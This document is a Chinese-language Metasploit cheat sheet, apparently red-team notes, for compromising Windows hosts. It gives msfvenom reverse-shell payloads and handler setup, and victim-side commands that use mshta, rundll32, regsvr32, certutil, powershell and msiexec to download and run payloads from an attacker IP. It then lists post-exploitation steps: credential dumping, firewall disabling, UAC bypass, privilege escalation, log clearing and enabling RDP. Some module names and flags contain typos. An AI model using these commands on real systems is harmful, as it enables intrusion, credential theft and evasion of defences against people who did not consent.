# Metasploit

●  **mshta.exe**

●  mshta.exe是用于负责解释运行HTA文件的Windows OS实用程序·可以运行javascript或VBScript的HTML文件

●  

●  use exploit/windows/misc/hta_server

●  set srvhost 192.168.0.104

●  exploit -j

●  目标主机上运行 mshta.exe http://192.168.0.104:8080/SxUxU5AvkuW2LCX.hta

●  

●  方法二：

●  复制以下模板XSL文件，修改其中hta文件的地址为上图中的地址即可。<?xml version='1.0'?><stylesheetxmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"xmlns:user="placeholder"version="1.0"><output method="text"/><ms:script implements-prefix="user" language="JScript"><![CDATA[var r = new ActiveXObject("WScript.Shell").Run("mshta.exe http://192.168.123.43:8080/OtUpxMXOEhocL.hta");]]> </ms:script></stylesheet>

●  将上面文件保存为xsl文件，并放到apache根目录/var/www/html。

●  被控端执行 wmic os get /format:"http://172.20.0.27/ptsh.xsl"

●  **Rundll32.exe**

●  Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数（16位或32位），并将其储存在适当的内存库中。

●  use exploit/windows/smb/smb_delivery

●  set srvhost 192.168.1.121

●  exploit -j

●  被控端执行 rundll32.exe \\192.168.1.121\qFMnFO\test.dll,0

●  **Regsvr32.exe**

●  Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。

●  Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。

●  

●  use exploit/multi/script/web_delivery

●  set srvhost 192.168.1.121

●  set target 3

●  set payload windows/x64/meterpreter/reverse_tcp

●  set lhost 192.168.1.121

●  exploit –j

●  

●  被控端执行 regsvr32 /s /n /u /i:http://192.168.1.121:8080/yvj3GKJwvde.sct scrobj.dll

●  

●  **Certutil.exe**

●  Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目计算机中执行恶意的exe文件以获得meterpreter会话

●  

●  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.121 lport=6666 -f exe > shell.exe

●  python3 -m http.server

●  

●  被控制端 certutil.exe -urlcache -split -f http://192.168.1.121:8000/shell.exe shell.exe & shell.exe

●  

●  use exploit/multi/handler

●  set payload windows/x64/meterpreter/reverse_tcp

●  set lhost 192.168.1.121

●  set lport 6666

●  exploit

●  **Powershell.exe**

●  **Web Delivery****反弹shell**

●  use exploit/multi/script/web_delivery

●  set target 2

●  set payload windows/x64/meterpreter/reverse_tcp

●  set lhost 192.168.1.121

●  set lport 4444

●  exploit -j

●  

●  **powershell****启动cscript.exe**

●  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.121 lport=8888 -f vbs -o 8888.vbs

●  use exploit/multi/handler

●  set payload windows/x64/meterpreter/reverse_tcp

●  set lhost 192.168.1.121

●  set lport 8888

●  exploit

●  

●  被控端执行 

●  powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.121:8000/8888.vbs','C:\Users\Administrator\Desktop\8888.vbs');Start-Process C:\Windows\System32\cscript.exe C:\Users\Administrator\Desktop\8888.vbs"

●  

●  **powershell****启动bat文件**

●  msfvenom -p cmd/windows/powershell_reverse_tcp lhost=192.168.1.121 lport=9999 -o 9999.bat

●  python3 -m http.server

●  use exploit/multi/handler

●  set payload windows/x64/meterpreter/reverse_tcp

●  set lhost 192.168.1.121

●  set lport 9999

●  exploit

●  

●  被控制端执行 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.121:8000/9999.bat')"

●  

●  **powershell****代码混淆**

●  启动Invoke-Obfuscation

●  powershell -ep bypass

●  Import-Module ./Invoke-Obfuscation.psd1

●  Invoke-Obfuscation

●  

![img](file:///C:/Users/PTSH/AppData/Local/Temp/msohtmlclip1/01/clip_image002.gif)

●  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.121 lport=4444 --arch x64 --platform wiindows -f psh-reflection -o 4444.ps1

●  

![img](file:///C:/Users/PTSH/AppData/Local/Temp/msohtmlclip1/01/clip_image004.gif)

●  Invoke-Obfuscation

●  启动完成过后，设置混淆脚本代码的位置

●  set scriptpath +文件位置

●  选择混淆方式为 TOKEN\ALL

●  保存混淆之后的脚本

●  out out.ps1

●  msf监听 handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.121 -P 4444

●  

●  **msiexec.exe**

●  Windows OS安装有一个Windows安装引擎·MSI包使用msiexe.exe来解释安装

●  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.103 lport=6666 -f msi >1.msi

●  被控制端执行 msiexec /i http://192.168.0.103:8000/1.msi

●  msf ：handler -p windows/x64/meterpreter_reverse_tcp -H 192.168.0.103 -P 6666

●  

●  **Metasploit** **后渗透阶段**

●  查看目标机最近的操作

●  **run post/windows/gather/dumplinks**

●  

●  load kiwi

●  creds_all： #列举所有凭据

●  

●  进程迁移 migrate

●  提权 getsystem

●  清理痕迹 clearev

●  当前目录 getwd

●  端口转发 Portfwd

●  进程 ps  or getpid

●  

●  run post/windows/gather/enum_applications #获取安装软件信息

●  **run scraper #****获取常见信息 #保存在～/.msf4/logs/scripts/scraper/目录下**

●  run post/windows/gather/dumplinks #获取最近的文件操作

●  

●  netsh advfirewall set allprofiles state off 关闭防火墙

●  **use exploit/windows/local/ms18_8120_win32k_privesc**  **提权**

●  **UAC** **绕过**

●  **use exploit/windows/local/bypassuac**

●  **use exploit/windows/local/bypassuac_injection**

●  **use windows/local/bypassuac_vbs**

●  **use windows/local/ask**

●  

●  浏览器 chrome

●  **run post/windows/gather/enum_chrome**

●  **run post/windows/gather/enum_ie**

●  

●  run post/windows/gather/smart_hashdump  hash 获取

●  run post/windows/manage/enable_rdp #开启远程桌面

●  run post/windows/manage/enable_rdp FORWARD=true LPORT=4435 #将3389端口转发到9988

●  

●  